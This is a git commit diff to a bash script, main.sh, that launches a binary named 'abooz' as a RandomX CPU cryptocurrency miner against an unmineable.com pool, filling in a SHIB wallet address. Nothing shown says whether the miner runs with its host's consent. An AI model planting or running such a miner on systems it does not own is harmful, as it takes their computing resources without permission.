055eb0d001156a2f3343161d384e9e0d3dc439a2
jidbepp <64148580+jidbepp@users.noreply.github.com>
2022-09-11 14:43:47 -0400

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
 chmod +x ./abooz
-./abooz -o rx.unmineable.com:3333 -a rx -k -u COIN:WALLET_ID.WORKERNAME -p x
+./abooz -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xD83886b9d37D53239B62Bc6E033eD6bfCc2C6fA7.my_cpu_miner -p x
